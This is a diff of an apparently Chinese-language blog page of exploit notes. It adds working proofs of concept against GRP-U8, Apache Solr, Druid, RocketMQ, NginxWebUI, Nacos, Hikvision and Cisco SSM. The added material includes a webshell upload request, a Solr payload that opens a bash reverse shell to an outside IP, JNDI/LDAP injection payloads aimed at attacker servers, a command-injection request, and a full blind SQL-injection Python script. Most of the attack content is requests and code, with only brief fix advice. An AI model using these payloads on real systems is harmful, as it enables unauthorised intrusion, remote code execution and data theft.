@@ -155,6 +155,14 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close        </span><br><span class="line"></span><br><span class="line">fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml">https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml</a></p>
+<h4 id="用友"><a href="#用友" class="headerlink" title="用友"></a>用友</h4><p>GRP-U8 存在任意文件上传漏洞</p>
+<p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;用友-GRP-U8&quot;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST http://127.0.0.1/UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=..%2F&amp;filename=94156577.jsp&amp;filename=1.jpg HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9</span><br><span class="line">Content-Type: multipart/form-data</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 177</span><br><span class="line"></span><br><span class="line">--ec126a48c5b7676dce1b676f5251358f</span><br><span class="line">Content-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;3135168535&quot;);%&gt;</span><br><span class="line">--ec126a48c5b7676dce1b676f5251358f--</span><br></pre></td></tr></table></figure>
+
+<p> 上传成后webshell地址：<a href="http://127.0.0.1/R9iPortal/94156577.jsp">http://127.0.0.1/R9iPortal/94156577.jsp</a></p>
 <h4 id="金蝶云星空RCE漏洞"><a href="#金蝶云星空RCE漏洞" class="headerlink" title="金蝶云星空RCE漏洞"></a>金蝶云星空RCE漏洞</h4><blockquote>
 <p><a href="https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502</a></p>
 </blockquote>
@@ -246,19 +254,96 @@
 <li>–lhost vps的IP地址</li>
 <li>–lport vps的端口，默认为21000</li>
 </ul>
-<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>Apache RocketMQ NameServer    cve-2023-33246</p>
-<blockquote>
+<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><h4 id="Apache-RocketMQ-NameServer-cve-2023-33246"><a href="#Apache-RocketMQ-NameServer-cve-2023-33246" class="headerlink" title="Apache RocketMQ NameServer    cve-2023-33246"></a>Apache RocketMQ NameServer    cve-2023-33246</h4><blockquote>
 <p> CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，导致在Apache RocketMQ NameServer 存在未授权访问的情况下，攻击者可构造恶意请求以RocketMQ运行的系统用户身份执行命令。</p>
 </blockquote>
+<p>CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，RocketMQ 5.1.0 及以下版本在一定条件下存在远程命令执行风险。RocketMQ的 NameServer、Broker、Controller 等多个组件暴露在外网且缺乏权限验证，攻击者可以利用此缺陷通过「更新配置」功能修改配置路径，进而以系统用户身份执行任意命令（伪造 RocketMQ 协议也可执行任意命令）。</p>
+<p><strong>影响版本</strong></p>
+<ol>
+<li>5.0.0 &lt;&#x3D; Apache RocketMQ &lt;&#x3D; 5.1.0</li>
+<li>4.0.0 &lt;&#x3D; Apache RocketMQ &lt;&#x3D; 4.9.5</li>
+</ol>
+<p><strong>exp</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 check.py --ip 127.0.0.1 --port 9876</span><br><span class="line">python3 check.py --cidr 192.168.1.0/24</span><br><span class="line"># or </span><br><span class="line">python3 check.py --file rocketmq_targets.txt --port 9876</span><br><span class="line"># target in file format:</span><br><span class="line"># ip</span><br><span class="line"># ip:port</span><br><span class="line"># http://ip:port</span><br></pre></td></tr></table></figure>
 
-<p>@J@#DaTang2023</p>
-<h3 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h3><p>未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/SuperZero/CVE-2023-33246</span><br><span class="line">#使用方法</span><br><span class="line">java -jar CVE-2023-33246.jar -ip &quot;127.0.0.1&quot; -cmd &quot;注入的命令&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>@)@#DaTang2023</p>
+<h4 id="Apache-Flink-RCE"><a href="#Apache-Flink-RCE" class="headerlink" title="Apache Flink RCE"></a>Apache Flink RCE</h4><p><strong>影响版本</strong></p>
+<p>Apache Flink &lt;&#x3D; 1.9.1</p>
+<p><strong>poc</strong></p>
+<p>直接上传jar木马 连接</p>
+<h4 id="Apache-Solr-代码执行漏洞"><a href="#Apache-Solr-代码执行漏洞" class="headerlink" title="Apache Solr 代码执行漏洞"></a><strong>Apache Solr 代码执行漏洞</strong></h4><blockquote>
+<p>CNVD-2023-27598</p>
+<p>Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。</p>
+</blockquote>
+<p><strong>影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.10.0 &lt;= Apache Solr &lt; 9.2.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用方法：</strong><br>使用postCommit来命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.1.92:8983</span><br><span class="line">Content-Length: 180</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;suiyi&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;bash&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.92/6666 0&gt;&amp;1&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过newSearcher命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.1.92:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher3&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;ping -c 3 x9hr3z.dnslog.cn&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复建议</strong><br>如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性： configset.upload.enabled 设置为 false ，详细参考： <a href="https://lucene.apache.org/solr/guide/8_6/configsets-api.html">https://lucene.apache.org/solr/guide/8_6/configsets-api.html</a><br>使用身份验证&#x2F;授权，详细参考：<a href="https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plu">https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plu</a><br>gins.html<br>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：<br><a href="https://github.com/apache/solr/releases/tag/releases/solr/9.2.0">https://github.com/apache/solr/releases/tag/releases/solr/9.2.0</a></p>
+<h4 id="Apache-Druid-远程代码执行漏洞"><a href="#Apache-Druid-远程代码执行漏洞" class="headerlink" title="Apache Druid 远程代码执行漏洞"></a><strong>Apache Druid 远程代码执行漏洞</strong></h4><blockquote>
+<p>QVD-2023-9629</p>
+<p>该漏洞源于 Apache Kafka Connect JNDI 注入漏洞(CVE-2023-25194)，Apache Druid 由于支持从 Kafka 加载数据，刚好满足其利用条件，攻击者可通过修改Kafka 连接配置属性进行 JNDI 注入攻击，进而在服务端执行任意恶意代码。</p>
+</blockquote>
+<p><strong>影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Druid &lt;= 25.0.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>poc</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?for=connect HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1437</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;spec&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;ioConfig&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;consumerProperties&quot;:&#123;</span><br><span class="line">&quot;bootstrap.servers&quot;:&quot;1.1.1.1:9092&quot;,</span><br><span class="line">&quot;sasl.mechanism&quot;:&quot;SCRAM-SHA-256&quot;,</span><br><span class="line">&quot;security.protocol&quot;:&quot;SASL_SSL&quot;,</span><br><span class="line">&quot;sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://x.x.x.x\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;topic&quot;:&quot;any&quot;,</span><br><span class="line">&quot;useEarliestOffset&quot;:true,</span><br><span class="line">&quot;inputFormat&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;regex&quot;,</span><br><span class="line">&quot;pattern&quot;:&quot;([\\s\\S]*)&quot;,</span><br><span class="line">&quot;listDelimiter&quot;:&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;,</span><br><span class="line">&quot;columns&quot;:[</span><br><span class="line">&quot;raw&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dataSchema&quot;:&#123;</span><br><span class="line">&quot;dataSource&quot;:&quot;sample&quot;,</span><br><span class="line">&quot;timestampSpec&quot;:&#123;</span><br><span class="line">&quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,</span><br><span class="line">&quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dimensionsSpec&quot;:&#123;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">&quot;granularitySpec&quot;:&#123;</span><br><span class="line">&quot;rollup&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;tuningConfig&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;samplerConfig&quot;:&#123;</span><br><span class="line">&quot;numRows&quot;:500,</span><br><span class="line">&quot;timeoutMs&quot;:15000</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>user.provider.url处填写你的恶意ldap服务url<br><strong>修复建议</strong></p>
+<ol>
+<li>避免 Apache Druid 开放至公网。</li>
+<li>开启身份认证机制,可参考官方文档：<a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></li>
+</ol>
+<h3 id="NginxWebUI-runCmd-远程代码执行漏洞"><a href="#NginxWebUI-runCmd-远程代码执行漏洞" class="headerlink" title="NginxWebUI runCmd 远程代码执行漏洞"></a><strong>NginxWebUI runCmd 远程代码执行漏洞</strong></h3><blockquote>
+<p>CVE-2023-33246</p>
+<p>该漏洞源于开发人员没有对 runCmd 接口处传入的参数进行有效过滤，攻击者可在无需登录的情况下绕过路由权限校验，通过拼接语句的方式执行任意命令，最终控制服务器</p>
+</blockquote>
+<p><strong>影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginxWebUI &lt; 3.5.1（v3.5.1 版本修复了登陆绕过漏洞，但是 RCE 漏洞在最新版本（v3.6.5）中仍可绕过防护进行利用）</span><br></pre></td></tr></table></figure>
+
+<p><strong>poc</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /AdminPage/conf/runCmd?cmd=执行的命令%26%26echo%20nginx HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测工具</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/chaitin/xpoc</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>修复建议</strong></p>
+<ol>
+<li>通过设置安全组功能，仅对可信地址和内网开放 nginxWebUI 来缓解风险。</li>
+<li>官方已发布漏洞补丁及修复版本，但组件修复不完全，防护机制可被绕过，且其他接口仍存在多个高危漏洞。因此建议受漏洞影响的用户及时关注厂商公告并及时更新 NginxWebUI：<a href="http://file.nginxwebui.cn/nginxWebUI-3.6.5.jar">http://file.nginxwebui.cn/nginxWebUI-3.6.5.jar</a></li>
+</ol>
+<h3 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a><strong>未授权访问</strong></h4><blockquote>
+<p>大部分企业的 nacos的url为 &#x2F;v1&#x2F;auth&#x2F;users ，而不是  &#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users</p>
+</blockquote>
 <p><a href="http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&pageSize=9（ip和端口用x代替）">http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&amp;pageSize=9（ip和端口用x代替）</a></p>
 <p>可以看到账号密码</p>
 <p>get 参数改成post然后提交一个新的用户名和密码</p>
 <p>POST <a href="https://link.zhihu.com/?target=http://IP">http://IP</a>:端口&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?username&#x3D;test1&amp;password&#x3D;test1</p>
 <p>这个时候我们用test1登录</p>
+<h4 id="Nacos-集群-Raft-反序列化漏洞"><a href="#Nacos-集群-Raft-反序列化漏洞" class="headerlink" title="Nacos 集群 Raft 反序列化漏洞"></a>Nacos 集群 Raft 反序列化漏洞</h4><blockquote>
+<p>CNVD-2023-45001</p>
+<p>该漏洞源于 Nacos 集群处理部分 Jraft 请求时，未限制使用 hessian 进行反 。序列化，攻击者可以通过发送特制的请求触发该漏洞，最终执行任意远程代码。<br>该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。</p>
+</blockquote>
+<p><strong>影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.4.0 &lt;= Nacos &lt; 1.4.6</span><br><span class="line">2.0.0 &lt;= Nacos &lt; 2.2.3</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong><br><a href="https://github.com/c0olw/NacosRce/">https://github.com/c0olw/NacosRce/</a></p>
+<p><strong>修复建议</strong></p>
+<ol>
+<li>默认配置下该漏洞仅影响 Nacos 集群间 Raft 协议通信的 7848 端口，此端口不承载客户端请求，可以通过限制集群外部 IP 访问 7848 端口来进行缓解。</li>
+<li>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本： <a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></li>
+</ol>
 <h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
 <h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
@@ -352,6 +437,26 @@
 <p><strong>漏洞修复</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/</span><br></pre></td></tr></table></figure>
 
+<h4 id="海康威视综合安防管理平台Fastjson远程命令执行漏洞"><a href="#海康威视综合安防管理平台Fastjson远程命令执行漏洞" class="headerlink" title="海康威视综合安防管理平台Fastjson远程命令执行漏洞"></a>海康威视综合安防管理平台Fastjson远程命令执行漏洞</h4><p><strong>影响范围</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V2.0.0 &lt;= iVMS-8700 &lt;= V2.9.2</span><br><span class="line">V1.0.0 &lt;= iSecure Center &lt;= V1.7.0</span><br></pre></td></tr></table></figure>
+
+<p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=“HIKVISION-综合安防管理平台”</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 204</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://kjvqweuoav.dnstunnel.run&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>dns能回显，JNDIExploit-1.4-SNAPSHOT.jar执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPSip </span><br></pre></td></tr></table></figure>
+
+<p>然后在Burp的请求数据包头部加上字段 <code>cmd: whoami</code> 这里cmd可执行系统命令，下方payload中ldap改成你的VPSip&#x2F;Basic&#x2F;TomcatEcho，如下数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>补丁</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="海康威视AK信息泄露漏洞"><a href="#海康威视AK信息泄露漏洞" class="headerlink" title="海康威视AK信息泄露漏洞"></a><strong>海康威视AK信息泄露漏洞</strong></h4><p>进行js多次查看发现存在jsconfig的调用。</p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185345443.png" alt="image-20230613185345443"></p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185405052.png" alt="image-20230613185405052"></p>
@@ -372,21 +477,60 @@
 
 <p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
-<h3 id="思科"><a href="#思科" class="headerlink" title="思科"></a>思科</h3><blockquote>
+<h3 id="思科"><a href="#思科" class="headerlink" title="思科"></a>思科</h3><h4 id="智能软件管理器本地-SQL-注入漏洞"><a href="#智能软件管理器本地-SQL-注入漏洞" class="headerlink" title="智能软件管理器本地 SQL 注入漏洞"></a>智能软件管理器本地 SQL 注入漏洞</h4><blockquote>
 <p>Cisco Smart Software Manager On-Prem (SSM On-Prem) 基于 Web 的管理界面中存在漏洞，可能允许经过身份验证的远程攻击者对受影响的系统进行 SQL 注入攻击。该漏洞的存在是因为基于 Web 的管理界面无法充分验证用户输入。攻击者可以通过以低权限用户身份向应用程序进行身份验证并向受影响的系统发送精心设计的 SQL 查询来利用此漏洞。</p>
 </blockquote>
 <p>1.改poc里边的ip和cookie</p>
 <p>2.python exploit.py</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Smart Software Manager On-Prem Release 8-202212 - Authenticated SQL Injection in &#x27;filter_by&#x27; parameter</span></span><br><span class="line"><span class="string">Download link: https://software.cisco.com/download/home/286285506/type/286326948/release/8-202212</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">1. Update host and cookies variables,</span></span><br><span class="line"><span class="string">2. Run `python3 exploit.py`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on Ubuntu 22.04.1 LTS, Python 3.10.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">by redfr0g@stmcyber 2023</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># script parameters, update accoridingly</span></span><br><span class="line">host = <span class="string">&quot;&lt;IP&gt;:8443&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;_lic_engine_session&quot;</span>: <span class="string">&quot;&lt;COOKIE&gt;&quot;</span>, <span class="string">&quot;XSRF-TOKEN&quot;</span>: <span class="string">&quot;&lt;CSRFTOKEN&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;P%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">chars = string.printable[<span class="number">0</span>:<span class="number">95</span>]</span><br><span class="line">result = []</span><br><span class="line">search = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting DBMS banner enumeration...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do error based sql injection until no match found</span></span><br><span class="line"><span class="keyword">while</span> search:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result) + char + <span class="string">&quot;%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># disable invalid cert warnings</span></span><br><span class="line">        <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">            warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            r = requests.get(url, headers=headers, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PG::DivisionByZero&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># update and print result</span></span><br><span class="line">            result.append(char)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] DBMS Banner: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot; &quot;</span>:</span><br><span class="line">            <span class="comment"># stop search if no match found</span></span><br><span class="line">            search = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p>4.7.6任意文件下载</p>
-<blockquote>
+<h3 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a>H3C</h3><h4 id="H3C-Magic-B1STV100R012远程代码执行漏洞-CVE-2023-34928"><a href="#H3C-Magic-B1STV100R012远程代码执行漏洞-CVE-2023-34928" class="headerlink" title="H3C Magic B1STV100R012远程代码执行漏洞(CVE-2023-34928)"></a>H3C Magic B1STV100R012远程代码执行漏洞(CVE-2023-34928)</h4><p>影响版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H3C Magic B1STV100R012</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
